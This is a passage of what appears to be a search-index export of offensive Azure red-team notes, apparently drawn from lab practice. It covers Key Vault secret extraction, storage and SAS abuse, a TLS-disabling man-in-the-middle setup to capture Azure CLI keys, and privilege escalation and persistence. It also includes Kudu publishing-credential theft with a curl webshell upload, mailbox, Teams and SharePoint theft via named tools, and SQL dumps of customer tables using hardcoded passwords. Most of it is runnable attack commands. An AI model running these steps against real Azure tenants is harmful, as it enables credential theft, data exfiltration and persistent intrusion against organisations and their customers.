ForEach-Object {\nWrite-Host \"Secret Name: $($_.id)\"\n}\n</code></pre> this will output secret name and endpoint.</p> <p>Read the secret: <pre><code>$secretName = \"&lt;name returned from above&gt;\"\n$apiVersion = \"7.1\"\n$vaultName = \"&lt;vault&gt;\"\n$accessToken = ''\n$secretUri = \"https://$vaultName.vault.azure.net/secrets/${secretName}?api-\nversion=$apiVersion\"\n$headers = @{\n'Authorization' = \"Bearer $accessToken\"\n'Content-Type' = 'application/json'\n}\n$secretResponse = Invoke-RestMethod -Uri $secretUri -Method Get -Headers $headers\nWrite-Host \"Secret Value: $($secretResponse.value)\"\n</code></pre></p>"},{"location":"Azure/azure_networking/","title":"Azure networking","text":"<p>Get networking info about a VM <pre><code>az network public-ip show --resource-group RESOURCEGROUP --name VMNAMEip304 --query \"ipAddress\" --output tsv\n</code></pre></p>"},{"location":"Azure/azure_storage/","title":"Azure Storage","text":""},{"location":"Azure/azure_storage/#storage-endpoints","title":"Storage Endpoints","text":"Storage service Endpoint Blob Storage https://.blob.core.windows.net Static website (Blob Storage) https://.web.core.windows.net Data Lake Storage Gen2 https://.dfs.core.windows.net Azure Files https://.file.core.windows.net Queue Storage https://.queue.core.windows.net Table Storage https://.table.core.windows.net"},{"location":"Azure/azure_storage/#discovery","title":"Discovery","text":"<p>Sometimes you can identify in source code of website or automated: [[external_recon]]</p>"},{"location":"Azure/azure_storage/#storage-account-configurations","title":"Storage Account Configurations","text":""},{"location":"Azure/azure_storage/#main-configuration-options","title":"Main Configuration Options","text":"<ul> <li>Every storage account must have a unique name across all Azure</li> <li>Every storage account is deployed in a region or in an Azure extended zone</li> <li>Premium version available for better performance</li> <li>4 types of redundancy to protect against rack, drive and datacenter failures</li> </ul>"},{"location":"Azure/azure_storage/#security-configuration-options","title":"Security Configuration Options","text":"<ul> <li>Require secure transfer: Require TLS in any communication with the storage</li> <li>Allow anonymous access: If disabled, anonymous access cannot be enabled later</li> <li>Enable storage account key access: If disabled, access with Shared Keys is forbidden</li> <li>Minimum TLS version: Set minimum TLS version</li> <li>Permitted scope for copy operations: Allow from any storage account, same Entra tenant, or private endpoints in same VNet</li> </ul>"},{"location":"Azure/azure_storage/#blob-storage-options","title":"Blob Storage Options","text":"<ul> <li>Allow cross-tenant replication</li> <li>Access tier: Hot (frequently accessed), Cool and Cold (rarely accessed)</li> </ul>"},{"location":"Azure/azure_storage/#networking-options","title":"Networking Options","text":"<ul> <li>Allow from all networks</li> <li>Allow from selected virtual networks and IP addresses</li> <li>Disable public access and use private access</li> <li>Private endpoints: Private connection to storage account from VNet</li> </ul>"},{"location":"Azure/azure_storage/#data-protection-options","title":"Data Protection Options","text":"<ul> <li>Point-in-time restore for containers: Restore containers to earlier state (requires versioning, change feed, and blob soft delete)</li> <li>Enable soft delete for blobs: Retention period for deleted blobs (even overwritten)</li> <li>Enable soft delete for containers: Retention period for deleted containers</li> <li>Enable soft delete for file shares: Retention period for deleted file shares</li> <li>Enable versioning for blobs: Maintain previous versions of blobs</li> <li>Enable blob change feed: Log create, modification, and delete changes to blobs</li> <li>Enable version-level immutability support: Time-based retention policy on account-level for all blob versions</li> <li>Note: Version-level immutability support and point-in-time restore cannot be enabled simultaneously</li> </ul>"},{"location":"Azure/azure_storage/#encryption-configuration-options","title":"Encryption Configuration Options","text":"<ul> <li>Encryption type: Microsoft-managed keys (MMK) or Customer-managed keys (CMK)</li> <li>Enable infrastructure encryption: Double encrypt data for additional security</li> </ul>"},{"location":"Azure/azure_storage/#container-public-exposure","title":"Container Public Exposure","text":"<p>Containers organize blobs for easier management. Public exposure options: - Private: No public access - Blob: Read access for blobs only - Container: Read access for container listing and blobs</p>"},{"location":"Azure/azure_storage/#authentication-methods","title":"Authentication Methods","text":""},{"location":"Azure/azure_storage/#rbac-authentication","title":"RBAC Authentication","text":"<p>Azure Storage supports Microsoft Entra ID authorization using Azure RBAC:</p> <pre><code>az role assignment create --role \"Storage Blob Data Contributor\" --assignee &lt;email&gt; --scope \"/subscriptions/&lt;subscription&gt;/resourceGroups/&lt;resource-group&gt;/providers/Microsoft.Storage/storageAccounts/&lt;storage-account&gt;/blobServices/default/containers/&lt;container&gt;\"\n</code></pre>"},{"location":"Azure/azure_storage/#access-key-authentication","title":"Access Key Authentication","text":"<p>Storage accounts have access keys providing full access to the storage account. Access keys are not automatically rotated.</p>"},{"location":"Azure/azure_storage/#shared-key-lite-shared-keys","title":"Shared Key &amp; Lite Shared Keys","text":"<p>Generate signed URLs using access keys for authorization.</p> <p>Shared Key StringToSign: <pre><code>VERB + \"\\n\" +\nContent-Encoding + \"\\n\" +\nContent-Language + \"\\n\" +\nContent-Length + \"\\n\" +\nContent-MD5 + \"\\n\" +\nContent-Type + \"\\n\" +\nDate + \"\\n\" +\nIf-Modified-Since + \"\\n\" +\nIf-Match + \"\\n\" +\nIf-None-Match + \"\\n\" +\nIf-Unmodified-Since + \"\\n\" +\nRange + \"\\n\" +\nCanonicalizedHeaders +\nCanonicalizedResource\n</code></pre></p> <p>Lite Shared Key StringToSign: <pre><code>VERB + \"\\n\" +  \nContent-MD5 + \"\\n\" +  \nContent-Type + \"\\n\" +  \nDate + \"\\n\" +  \nCanonicalizedHeaders +   \nCanonicalizedResource\n</code></pre></p> <p>Authorization Header: <pre><code>Authorization=\"[SharedKey|SharedKeyLite] &lt;AccountName&gt;:&lt;Signature&gt;\"\n\nAuthorization: SharedKey myaccount:ctzMq410TV3wS7upTBcunJTDLEJwMAZuFPfr0mrrA08=\n</code></pre></p> <p>MitM to capture Azure CLI keys: <pre><code>export ADAL_PYTHON_SSL_NO_VERIFY=1\nexport AZURE_CLI_DISABLE_CONNECTION_VERIFICATION=1\nexport HTTPS_PROXY=\"http://127.0.0.1:8080\"\nexport HTTP_PROXY=\"http://127.0.0.1:8080\"\nexport REQUESTS_CA_BUNDLE=/path/to/cacert.pem\n\naz storage blob download \\\n  --account-name &lt;account&gt; \\\n  --container-name &lt;container&gt; \\\n  --name &lt;blob&gt; \\\n  --file /tmp/file\n</code></pre></p>"},{"location":"Azure/azure_storage/#shared-access-signature-sas","title":"Shared Access Signature (SAS)","text":"<p>SAS are secure, time-limited URLs granting specific permissions without exposing access keys.</p>"},{"location":"Azure/azure_storage/#types-of-sas","title":"Types of SAS","text":"<ul> <li>User delegation SAS: Created from Entra ID principal, only for blob and data lake storage, max 7 days</li> <li>Service SAS: Signed using storage account access key, for specific resources in single service</li> <li>Account SAS: Signed using access key, grants access across all storage services</li> </ul>"},{"location":"Azure/azure_storage/#sas-url-examples","title":"SAS URL Examples","text":"<p>Access key signed: <pre><code>https://&lt;container&gt;.blob.core.windows.net/newcontainer?sp=r&amp;st=2021-09-26T18:15:21Z&amp;se=2021-10-27T02:14:21Z&amp;spr=https&amp;sv=2021-07-08&amp;sr=c&amp;sig=7S%2BZySOgy4aA3Dk0V1cJyTSIf1cW%2Fu3WFkhHV32%2B4PE%3D\n</code></pre></p> <p>User delegation signed: <pre><code>https://&lt;container&gt;.blob.core.windows.net/testing-container?sp=r&amp;st=2024-11-22T15:07:40Z&amp;se=2024-11-22T23:07:40Z&amp;skoid=&lt;id&gt;&amp;sktid=&lt;id&gt;&amp;skt=2024-11-22T15:07:40Z&amp;ske=2024-11-22T23:07:40Z&amp;sks=b&amp;skv=2022-11-02&amp;spr=https&amp;sv=2022-11-02&amp;sr=c&amp;sig=&lt;sig&gt;\n</code></pre></p> <p>Parameters: - <code>se</code>: Expiration date - <code>sp</code>: Permissions - <code>sig</code>: Signature validation - <code>ss</code>: Allowed services (account SAS) - <code>srt</code>: Resource types allowed (account SAS)</p> <p>Note: SAS tokens are not tracked by Azure.</p>"},{"location":"Azure/azure_storage/#sftp-for-azure-blob-storage","title":"SFTP for Azure Blob Storage","text":"<p>Azure Blob Storage supports SFTP for secure file transfer directly to Blob Storage.</p> <p>Key Features: - Works with hierarchical namespace (HNS) configured accounts - Uses local user identities (no RBAC/ABAC integration) - Authentication via Azure-generated passwords or SSH key pairs - Granular permissions (Read, Write, Delete, List) for up to 100 containers - Connections through port 22 - Supports network configurations (firewalls, private endpoints, VNets)</p>"},{"location":"Azure/azure_storage/#blob-storage","title":"Blob Storage","text":""},{"location":"Azure/azure_storage/#blob-url-breakdown","title":"Blob URL Breakdown","text":"<p><pre><code>https://domainblobwebsite.blob.core.windows.net/$web/index.html\n</code></pre> - https: Protocol (supports http and https) - domainblobwebsite: Storage account name - blob.core.windows.net: Azure Blob Storage Service - $web: Container name hosting the website</p>"},{"location":"Azure/azure_storage/#unauthenticated-access","title":"Unauthenticated Access","text":"<p>Validate blob storage: <pre><code>Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head\n</code></pre></p> <p>List objects in container: <pre><code>https://domainblobwebsite.blob.core.windows.net/$web?restype=container&amp;comp=list\n</code></pre></p> <p>List directories only: <pre><code>https://domainblobwebsite.blob.core.windows.net/$web?restype=container&amp;comp=list&amp;delimiter=%2F\n</code></pre></p> <p>Check for blob versions (requires x-ms-version: 2019-12-12+): <pre><code>curl -H \"x-ms-version: 2019-12-12\" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&amp;comp=list&amp;include=versions'\n</code></pre></p> <p>Download specific version: <pre><code>curl -H \"x-ms-version: 2019-12-12\" 'https://blobdomainwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2025-08-07T21:08:03.6678148Z' --output scripts-transfer.zip\n</code></pre></p>"},{"location":"Azure/azure_storage/#authenticated-enumeration","title":"Authenticated Enumeration","text":"<p>List storage accounts: <pre><code>az storage account list\n</code></pre></p> <p>List containers: <pre><code>az storage container list --account-name &lt;name&gt;\n</code></pre></p> <p>Check public access: <pre><code>az storage container show-permission --account-name &lt;acc-name&gt; -n &lt;container-name&gt;\n</code></pre></p> <p>Make container public: <pre><code>az storage container set-permission \\\n  --public-access container \\\n  --account-name &lt;acc-name&gt; \\\n  -n &lt;container-name&gt;\n</code></pre></p> <p>List blobs: <pre><code>az storage blob list \\\n  --container-name &lt;container&gt; \\\n  --account-name &lt;account&gt;\n</code></pre></p> <p>Download blob: <pre><code>az storage blob download \\\n  --account-name &lt;account&gt; \\\n  --container-name &lt;container&gt; \\\n  --name &lt;blob&gt; \\\n  --file &lt;/path/to/file&gt;\n</code></pre></p>"},{"location":"Azure/azure_storage/#restore-blob-version","title":"Restore blob version","text":"<p>List version (note version timestamp) <pre><code>az storage blob list \\\naz storage blob list --account-name accountname --container-name containername --include v\n</code></pre></p> <p>Download specific blob version <pre><code>az storage blob download \\\n    --account-name &lt;storage-account-name&gt; \\\n    --container-name &lt;container-name&gt; \\\n    --name &lt;blob-name&gt; \\\n    --file &lt;local-destination-path-and-filename&gt; \\\n    --version-id &lt;version-id&gt;\n</code></pre></p>"},{"location":"Azure/azure_storage/#access-keys","title":"Access Keys","text":"<p>Access keys allow persistent access to the entirety of the Azure storage account - not just an individual resource. They are not automatically rotated at any point.</p>"},{"location":"Azure/azure_storage/#using-a-key-to-authenticate","title":"Using a key to authenticate","text":"<p>List all File Shares: This confirms you have read access to the Azure Files service <pre><code>az storage share list --account-name &lt;name&gt; --account-key &lt;key&gt;\n</code></pre></p> <p>List all Blob Containers: This confirms you have read access to the Azure Blob service and can see all containers. <pre><code>az storage container list --account-name &lt;name&gt; --account-key &lt;key&gt;\n</code></pre></p> <p>List Files within a Share/Directory: This confirms you have read/list access to the file data. <pre><code>az storage file list --share-name &lt;share&gt; --account-name &lt;name&gt; --account-key &lt;key&gt;\n</code></pre></p> <p>List access keys: <pre><code>az storage account keys list --account-name &lt;name&gt;\n</code></pre></p> <p>Check key policies: <pre><code>az storage account show -n &lt;name&gt; --query \"{KeyPolicy:keyPolicy}\"\n</code></pre></p> <p>Use key for authentication: <pre><code>az storage blob list \\\n  --container-name &lt;container&gt; \\\n  --account-name &lt;account&gt; \\\n  --account-key \"ZrF40pkVKvWPUr[...]v7LZw==\"\n</code></pre></p> <p>[!Note] File Recovery If you have access to a storage service, check if you can restore deleted files or restore previous blob versions.</p>"},{"location":"Azure/azure_storage/#sas-enumeration","title":"SAS Enumeration","text":"<p>List access policies: <pre><code>az storage &lt;container|queue|share|table&gt; policy list \\\n  --account-name &lt;acc&gt; \\\n  --container-name &lt;container&gt;\n</code></pre></p> <p>Generate SAS with access key: <pre><code>az storage &lt;container|queue|share|table|blob&gt; generate-sas \\\n  --permissions acdefilmrtwxy \\\n  --expiry 2024-12-31T23:59:00Z \\\n  --account-name &lt;acc&gt; \\\n  -n &lt;container&gt;\n</code></pre></p> <p>Generate SAS with user delegation: <pre><code>az storage &lt;container|queue|share|table|blob&gt; generate-sas \\\n  --permissions acdefilmrtwxy \\\n  --expiry 2024-12-31T23:59:00Z \\\n  --account-name &lt;acc&gt; \\\n  --as-user --auth-mode login \\\n  -n &lt;container&gt;\n</code></pre></p> <p>Generate account SAS: <pre><code>az storage account generate-sas \\\n  --expiry 2024-12-31T23:59:00Z \\\n  --account-name &lt;acc&gt; \\\n  --services qt \\\n  --resource-types sco \\\n  --permissions acdfilrtuwxy\n</code></pre></p> <p>Use SAS token: <pre><code>az storage blob show \\\n  --account-name &lt;account&gt; \\\n  --container-name &lt;container&gt; \\\n  --sas-token 'se=2024-12-31T23%3A59%3A00Z&amp;sp=racwdxyltfmei&amp;sv=2022-11-02&amp;sr=c&amp;sig=&lt;sig&gt;' \\\n  --name 'file.txt'\n</code></pre></p> <p>Enumerate local users: <pre><code>az storage account local-user list \\\n  --account-name &lt;storage-account&gt; \\\n  --resource-group &lt;resource-group&gt;\n</code></pre></p>"},{"location":"Azure/azure_storage/#azure-file-share","title":"Azure File Share","text":""},{"location":"Azure/azure_storage/#what-is-azure-file-share","title":"What is Azure File Share?","text":"<p>Fully managed cloud file storage accessible via SMB and NFS protocols. Enables highly available network file shares accessible simultaneously by multiple VMs or on-premises systems.</p>"},{"location":"Azure/azure_storage/#access-tiers","title":"Access Tiers","text":"<ul> <li>Transaction Optimized: Optimized for transaction-heavy operations</li> <li>Hot: Balanced between transactions and storage</li> <li>Cool: Cost-effective for storage</li> <li>Premium: High-performance, low-latency, IOPS-intensive workloads</li> </ul>"},{"location":"Azure/azure_storage/#backups-snapshots","title":"Backups &amp; Snapshots","text":"<ul> <li>Daily backup: Created daily at specified time, stored 1-200 days</li> <li>Weekly backup: Created weekly at specified time, stored 1-200 weeks</li> <li>Monthly backup: Created monthly at specified time, stored 1-120 months</li> <li>Yearly backup: Created yearly at specified time, stored 1-10 years</li> <li>Manual backups: Possible at any time</li> <li>Note: NFS file shares don't support backups</li> </ul>"},{"location":"Azure/azure_storage/#network-protections","title":"Network Protections","text":"<p>Applied at Storage Account level: - Allow from all networks (cannot be used with NFS) - Allow from selected virtual networks and IP addresses - Disable public access and use private access - Private endpoints: Private connection from VNet</p>"},{"location":"Azure/azure_storage/#smb-authentication-methods","title":"SMB Authentication Methods","text":"<ul> <li>Access key as password</li> <li>On-premises AD DS Authentication: Uses on-premises AD credentials synced with Entra ID</li> <li>Microsoft Entra Domain Services Authentication: Uses cloud-based AD for Entra credentials</li> <li>Microsoft Entra Kerberos for Hybrid Identities: Entra users authenticate over internet using Kerberos (hybrid/cloud-only Entra joined VMs, no cloud-only identities)</li> <li>AD Kerberos Authentication for Linux Clients: Linux clients use Kerberos via on-premises AD DS or Entra Domain Services</li> </ul>"},{"location":"Azure/azure_storage/#nfs-authentication","title":"NFS \"Authentication\"","text":"<p>Root squash configurations: - Root squash: Root user mapped to anonymous user - No root squash: Root user mapped to root user - All squash: All users mapped to anonymous user</p> <p>Requirements: - Disable \"Secure transfer required\" (NFS doesn't support encryption) - Private access required (no public access) - Private endpoint exposed in VNet subnet with port 2049 open - Can discover with nmap</p>"},{"location":"Azure/azure_storage/#file-share-enumeration","title":"File Share Enumeration","text":"<p>List file shares: <pre><code>az storage share list --account-name &lt;name&gt;\naz storage share-rm list --storage-account &lt;name&gt; --include-deleted  # Include deleted\n</code></pre></p> <p>List files in share: <pre><code>az storage file list --account-name &lt;name&gt; --share-name &lt;share&gt;\n# Continue for subdirectories\naz storage file list --account-name &lt;name&gt; --share-name &lt;prev_dir/share&gt;\n</code></pre></p> <p>Download complete share: <pre><code>az storage file download-batch -d . --source &lt;share&gt; --account-name &lt;name&gt;\n</code></pre></p> <p>Get snapshots/backups: <pre><code>az storage share list --account-name &lt;name&gt; --include-snapshots --query \"[?snapshot != null]\"\n</code></pre></p> <p>List snapshot contents: <pre><code>az storage file list --account-name &lt;name&gt; --share-name &lt;share&gt; --snapshot &lt;snapshot-version&gt;\n</code></pre></p> <p>Download snapshot: <pre><code>az storage file download-batch -d . --account-name &lt;name&gt; --source &lt;share&gt; --snapshot &lt;snapshot-version&gt;\n</code></pre></p>"},{"location":"Azure/azure_storage/#local-enumeration","title":"Local Enumeration","text":"<p>Find NFS private endpoints: <pre><code>sudo nmap -n -T5 -Pn -p 2049,445 --open &lt;private-ip&gt;/16\n</code></pre></p> <p>Find mounted shares: <pre><code>mount | grep nfs\nmount | grep \"username=\"\n</code></pre></p>"},{"location":"Azure/azure_storage/#azure-table-storage","title":"Azure Table Storage","text":""},{"location":"Azure/azure_storage/#what-is-azure-table-storage","title":"What is Azure Table Storage?","text":"<p>NoSQL key-value store for large volumes of structured, non-relational data. High availability, low latency, and scalability. Data organized into tables with partition key and row key for fast lookups.</p> <p>Note: No built-in backup mechanism for table storage.</p>"},{"location":"Azure/azure_storage/#keys-structure","title":"Keys Structure","text":"<ul> <li>PartitionKey: Groups entities into logical partitions, improves query performance and scalability</li> <li>Example: Department (HR, IT)</li> <li>RowKey: Unique identifier within partition, combined with PartitionKey for global uniqueness</li> <li>Example: Employee ID within department</li> <li>Custom Properties: Additional user-defined properties stored as key-value pairs</li> <li>Example: Name, Age, Title</li> </ul>"},{"location":"Azure/azure_storage/#network-protections_1","title":"Network Protections","text":"<p>Applied at Storage Account level: - Allow from all networks - Allow from selected virtual networks and IP addresses - Disable public access and use private access - Private endpoints: Private connection from VNet</p>"},{"location":"Azure/azure_storage/#table-storage-enumeration","title":"Table Storage Enumeration","text":"<p>List tables: <pre><code>az storage table list --account-name &lt;name&gt;\n</code></pre></p> <p>Read table entities: <pre><code>az storage entity query \\\n  --account-name &lt;name&gt; \\\n  --table-name &lt;table&gt; \\\n  --num-results 10\n</code></pre></p>"},{"location":"Azure/azure_storage/#privilege-escalation","title":"Privilege Escalation","text":"<p>Microsoft.Storage/storageAccounts/listkeys/action - List and get access key values, enabling privilege escalation over storage accounts</p> <p>Microsoft.Storage/storageAccounts/regenerateKey/action - Renew and get new access key values, enabling privilege escalation. Returns both renewed and non-renewed key values</p> <p>Microsoft.Storage/storageAccounts/write - Create or update storage account, modify settings like network rules or policies</p> <p>Microsoft.Storage/storageAccounts/localusers/regeneratePassword/action - Regenerate local user password to access container and retrieve sensitive information</p>"},{"location":"Azure/azure_storage/#post-exploitation","title":"Post Exploitation","text":""},{"location":"Azure/azure_storage/#blob-storage_1","title":"Blob Storage","text":"<p>Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read - List blobs inside container and download files containing sensitive information</p> <p>Microsoft.Storage/storageAccounts/blobServices/containers/blobs/write - Write and overwrite files in containers, potentially causing damage or privilege escalation</p> <p>*/delete - Delete objects causing DoS and loss of valuable information</p>"},{"location":"Azure/azure_storage/#file-share-storage","title":"File Share Storage","text":"<p>Microsoft.Storage/storageAccounts/fileServices/fileshares/files/read - List files inside file share and download files containing sensitive information</p> <p>Microsoft.Storage/storageAccounts/fileServices/fileshares/files/write - Write and overwrite files in file shares, potentially causing damage or privilege escalation</p>"},{"location":"Azure/azure_storage/#table-storage","title":"Table Storage","text":"<p>Microsoft.Storage/storageAccounts/tableServices/tables/entities/read - List tables inside table storage and read information containing sensitive data</p> <p>Microsoft.Storage/storageAccounts/tableServices/tables/entities/write | Microsoft.Storage/storageAccounts/tableServices/tables/entities/add/action | Microsoft.Storage/storageAccounts/tableServices/tables/entities/update/action - Write, add, or update table entries, potentially causing damage or privilege escalation</p>"},{"location":"Azure/azure_storage/#persistence","title":"Persistence","text":"<ul> <li>Keep access keys</li> <li>Generate SAS tokens</li> <li>User delegated SAS are maximum 7 days</li> <li>Create local user in container</li> <li>Enable soft delete in blobs and containers</li> </ul>"},{"location":"Azure/azure_virtual_machines/","title":"Azure virtual machines","text":"<p>If you don't know jack shit about the resources you have access to why are you here? - [[resource_enumeration]]</p>"},{"location":"Azure/azure_virtual_machines/#enumeration","title":"Enumeration","text":"<pre><code>az vm show --resource-group 'resource group' --name 'vm name'\n</code></pre> <p>[!NOTE] NOTE VMs sometimes have userData defined containing sensitive strings.</p>"},{"location":"Azure/azure_virtual_machines/#userdata-enumeration","title":"UserData enumeration","text":"<p>Azure CLI <pre><code>az vm show --resource-group \"RGNAME\" --name \"VMNAME\" -u --query \"userData\" --output tsv | base64 -d\n</code></pre></p> <p>Az Powershell <pre><code>(Get-AzVM -ResourceGroupName \"RGNAME\" -Name \"VMNAME\" -UserData).UserData | base64 -d\n</code></pre></p> <p>With API call <pre><code>$token = 'ey...'\nInvoke-RestMethod -Method GET -Uri \"https://management.azure.com/subscriptions/&lt;SUBID&gt;/resourceGroups/&lt;RESOURCEGROUP&gt;/providers/Microsoft.Compute/virtualMachines/&lt;VM NAME&gt;?api-version=2021-07-01&amp;`$expand=userData\" -Headers @{Authorization = \"Bearer $token\"}\n</code></pre> or <pre><code>TOKEN='ey...'\n\ncurl -s -X GET -H \"Authorization: Bearer $TOKEN\" 'https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-22/providers/Microsoft.Compute/virtualMachines/SECURITY-DIRECTOR?api-version=2021-07-01&amp;$expand=userData' | jq '.properties.userData | @base64d'\n</code></pre></p>"},{"location":"Azure/azure_webapps/","title":"Azure webapps","text":"<p>You probably need info from [[resource_enumeration]] first</p>"},{"location":"Azure/azure_webapps/#enumeration","title":"Enumeration","text":"<p>Get info about a webapp resource <pre><code>(Get-AzWebApp -ResourceGroupName 'group' -Name 'companyports-site').SiteConfig\n</code></pre></p> <pre><code>Get-AzWebApp -Name megabigtechdevapp23\n</code></pre> <p>Static webapps:</p> <p>Get info <pre><code>az staticwebapp show --name 'name' --resource-group 'dat group'\n</code></pre></p> <p>Get settings (properties will sometimes contain sensitive info like conn strings) <pre><code>az staticwebapp appsettings list --name 'name' --resource-group 'dat group'\n</code></pre></p>"},{"location":"Azure/azure_webapps/#kudu-scm","title":"Kudu / SCM","text":"<p>This is a separate dev container from prod, have management stuff.</p> <p><pre><code>prod --&gt; companyapp.azurewebsites.net\nkudu/scm --&gt; companyapp.scm.azurewebsites.net\n</code></pre> You need the Website Contributor roles to utilize</p> <p>Exploitation</p> <p>If you can login, do to debug --&gt; powershell Then: [[managed_identity_and_apps]]</p> <p>OR</p> <p>find connection strings etc.. <pre><code>env | findstr 'password'\n</code></pre></p> <p>Find DB? do this from powershell session on kudu <pre><code>sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P 'V%#J3c5jceryjcE' -d customerdevneddb -Q \"SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'\"\n</code></pre></p> <p>Read table <pre><code>sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P 'V%#J3c5jceryjcE' -d customerdevneddb -Q \"SELECT * FROM CustomerData\"\n</code></pre></p> <p>Retrieve the FTPS deployment URL, username and password:</p> <pre><code>$webAppName = \"&lt;company-domain-portal&gt;\"\n$resourceGroupName = \"&lt;groupname&gt;\"\n\n$publishingProfileXml = [xml](Get-AzWebAppPublishingProfile -Name $webAppName -ResourceGroupName $resourceGroupName -OutputFile null)\n\n$username = $publishingProfileXml.SelectSingleNode(\"//publishData/publishProfile[@publishMethod='MSDeploy']\").userName\n$password = $publishingProfileXml.SelectSingleNode(\"//publishData/publishProfile[@publishMethod='MSDeploy']\").userPWD\n$ftpsProfile = $publishingProfileXml.SelectSingleNode(\"//publishData/publishProfile[@publishMethod='FTP']\")\n$ftpsUrl = $ftpsProfile.publishUrl\n\n$username\n$password\n$ftpsUrl\n</code></pre> <p>you can then upload a webshell or whatever you want via curl. <pre><code>curl -T shell.php --ssl ftps://&lt;company-domain-portal&gt;.ftp.azurewebsites.windows.net/site/wwwroot/portal/shell.php --user '&lt;PublishingUsername&gt;'\n</code></pre></p> <p>[!NOTE] Flames Azure webapps have Defender OFF by default</p>"},{"location":"Azure/container_apps/","title":"Container apps","text":""},{"location":"Azure/container_apps/#identify-container-apps","title":"Identify container apps","text":"<p>[[resource_enumeration]]</p>"},{"location":"Azure/container_apps/#enumerate","title":"Enumerate","text":"<p>General info (Also shows environment variables!) <pre><code>az containerapp show --name &lt;containerapp&gt; --resource-group &lt;group&gt;\n</code></pre></p>"},{"location":"Azure/container_apps/#exploit","title":"Exploit","text":"<p>Secrets <pre><code>az containerapp secret list -n &lt;containerapp&gt; -g &lt;group&gt; --show-values\n</code></pre> or with curl <pre><code>armtoken=\"accesstoken\"\n\ncurl -X POST \"https://management.azure.com/subscriptions/&lt;TENTANTID&gt;/resourceGroups/&lt;GROUP&gt;/providers/Microsoft.App/containerApps/&lt;CONTAINERNAME&gt;/listSecrets?api-version=2024-03-01\" \\\n-H \"Authorization: Bearer $armtoken\" \\\n-H \"Content-Type: application/json\" \\\n-H \"Content-Length: 0\"\n</code></pre></p> <p>Execute command <pre><code>az containerapp exec --name &lt;containerapp&gt; --resource-group &lt;group&gt;\n</code></pre> After execution: [[managed_identity_and_apps]]</p>"},{"location":"Azure/data_pillaging/","title":"Data pillaging","text":""},{"location":"Azure/data_pillaging/#general-recon","title":"General Recon","text":"<p>Gather info about Entra with ROADTools https://github.com/dirkjanm/ROADtools <pre><code>roadrecon gather\n</code></pre></p> <p>Determine if tenant is using teams, outlook, sharepoint. <pre><code>Get-MgUserLicenseDetail -UserId \"user.one@domain.com\"\n</code></pre> If \"O365_BUSINESS_ESSENTIALS\" then YES!</p>"},{"location":"Azure/data_pillaging/#email","title":"Email","text":"<p>Stealing exchange email https://github.com/rootsecdev/Azure-Red-Team/blob/master/Tokens/exfil_exchange_mail.py Add access token to script and run. <pre><code>python3 exfil_exchange_mail.py\n</code></pre></p> <p>GraphRunner https://github.com/dafthack/GraphRunner/ <pre><code>Invoke-SearchMailbox -Tokens $tokens -SearchTerm \"password\" -MessageCount 40\n</code></pre></p>"},{"location":"Azure/data_pillaging/#msteams","title":"MSTeams","text":"<p>Stealing teams messages https://github.com/Gerenios/AADInternals <pre><code>Import-Module ./AADInternals.psm1\nGet-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | fl id,content,deletiontime,*type*,DisplayName\n</code></pre></p> <p>GraphRunner https://github.com/dafthack/GraphRunner/ <pre><code>Invoke-SearchTeams -Tokens $tokens -SearchTerm password\n</code></pre></p>"},{"location":"Azure/data_pillaging/#sharepoint-onedrive","title":"SharePoint &amp; OneDrive","text":"<p>Searching for creds GraphRunner https://github.com/dafthack/GraphRunner/ <pre><code>Get-GraphTokens\nInvoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm password\n</code></pre> Graphrunner will ask if you'd like to download the files it finds.</p>"},{"location":"Azure/data_pillaging/#sql","title":"SQL","text":"<p>Connect <pre><code>$conn = New-Object System.Data.SqlClient.SqlConnection\n$password='$reporting$123'\n$conn.ConnectionString = \"Server=mbt-finance.database.windows.net;Database=Finance;User ID=financereports;Password=$password;\"\n$conn.Open()\n</code></pre></p> <p>Enum <pre><code>$sqlcmd = $conn.CreateCommand()\n$sqlcmd.Connection = $conn\n$query = \"SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';\"\n$sqlcmd.CommandText = $query\n$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd\n$data = New-Object System.Data.DataSet\n$adp.Fill($data) | Out-Null\n$data.Tables\n</code></pre></p> <p>Query <pre><code>$sqlcmd = $conn.CreateCommand()\n$sqlcmd.Connection = $conn\n$query = \"SELECT * FROM Subscribers;\"\n$sqlcmd.CommandText = $query\n$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd\n$data = New-Object System.Data.DataSet\n$adp.Fill($data) | Out-Null\n$data.Tables | ft\n</code></pre></p>"},{"location":"Azure/database/","title":"Database","text":"<p>Perform database query <pre><code>az storage entity query --table-name customers --account-name custdatabase --output table --auth-mode login\n</code></pre></p>"},{"location":"Azure/external_recon/","title":"External recon","text":""},{"location":"Azure/external_recon/#discover-public-resources-blob-apps-etc","title":"Discover public resources (blob, apps, etc...)","text":"<p>Using cloud_enum: https://github.com/initstring/cloud_enum </p> <p>Using azsubenum: https://github.com/yuyudhn/AzSubEnum <pre><code>python3 azsubenum.py -b companyname -t 10 -p permutations.txt\n</code></pre> Or default options <pre><code>python3 azsubenum.py -b companyname --thread 10\n</code></pre></p>"},{"location":"Azure/external_recon/#enumerate-tenant-information","title":"Enumerate tenant information","text":"<p>Federation info <pre><code>curl -s 'https://login.microsoftonline.com/getuserrealm.srf?login=domain.com' | jq\n</code></pre></p> <p>Get tenantID and OpenID configuration info</p> <pre><code>curl -s https://login.microsoftonline.com/domain.com/.well-known/openid-configuration | jq\n</code></pre> <p>With AADInternals <pre><code>Install-Module AADInternals\nImport-Module AADInternals\n</code></pre> <pre><code>Get-AADIntLoginInformation -Domain domain.com\n</code></pre></p> <p>Just tenantID <pre><code>Get-AADIntTenantID -Domain domain.com\n</code></pre></p> <p>Public configuration enumeration <pre><code>Invoke-AADIntReconAsOutsider -DomainName megabigtech.com\n</code></pre></p>"},{"location":"Azure/external_recon/#determine-azure-region","title":"Determine Azure Region","text":"<pre><code>curl 